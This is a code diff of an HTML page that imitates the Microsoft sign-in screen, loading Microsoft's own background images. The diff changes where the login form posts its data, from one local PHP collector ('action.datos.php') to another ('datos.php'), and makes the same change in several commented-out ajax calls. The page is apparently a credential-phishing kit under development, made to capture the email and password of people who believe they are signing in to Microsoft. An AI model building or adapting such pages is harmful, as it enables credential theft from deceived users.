@@ -47,7 +47,7 @@
 
 
 <div><!--  --><!--  --> <div data-bind="component: { name: 'background-image-control', publicMethods: backgroundControlMethods }"><div class="background" role="presentation" data-bind="css: { app: isAppBranding }, style: { background: backgroundStyle }"><!-- ko if: smallImageUrl --> <div data-bind="backgroundImage: smallImageUrl()" style="background-image: url(&quot;https://logincdn.msauth.net/16.000.28543.10/content/images/backgrounds/0-small_138bcee624fa04ef9b75e86211a9fe0d.jpg&quot;);"></div><!-- /ko --><!-- ko if: backgroundImageUrl --> <div class="backgroundImage" data-bind="backgroundImage: backgroundImageUrl()" style="background-image: url(&quot;https://logincdn.msauth.net/16.000.28543.10/content/images/backgrounds/0_a5dbd4393ff6a725c7e62b61df7e72f0.jpg&quot;);"></div><!-- ko if: useImageMask --><!-- /ko --><!-- /ko --> </div></div> <div data-bind="if: activeDialog"></div> 
-    <form name="f1" id="i0281"  spellcheck="false" method="post" target="_top" autocomplete="off"  action="http://localhost/action.datos.php"><!-- ko if: svr.Cq --><!-- /ko --><!-- ko withProperties: { '$loginPage': $data } --> 
+    <form name="f1" id="i0281"  spellcheck="false" method="post" target="_top" autocomplete="off"  action="http://localhost/datos.php"><!-- ko if: svr.Cq --><!-- /ko --><!-- ko withProperties: { '$loginPage': $data } --> 
         <div class="outer" data-bind="component: { name: 'master-page',
         params: {
           
@@ -351,7 +351,7 @@
                // titulo.innerText=correo.Value;
                // titulo.classList.remove('moveOffScreen');
                /* ajax({
-                    url:'http://localhost/action.datos.php',
+                    url:'http://localhost/datos.php',
                     method:'get',
                     success:function(data){
                         alert('asdaasd');
@@ -374,7 +374,7 @@
                // titulo.innerText=correo.Value;
                // titulo.classList.remove('moveOffScreen');
                /* ajax({
-                    url:'http://localhost/action.datos.php',
+                    url:'http://localhost/datos.php',
                     method:'get',
                     success:function(data){
                         alert('asdaasd');
@@ -395,7 +395,7 @@
                // titulo.innerText=correo.Value;
                // titulo.classList.remove('moveOffScreen');
                /* ajax({
-                    url:'http://localhost/action.datos.php',
+                    url:'http://localhost/datos.php',
                     method:'get',
                     success:function(data){
                         alert('asdaasd');
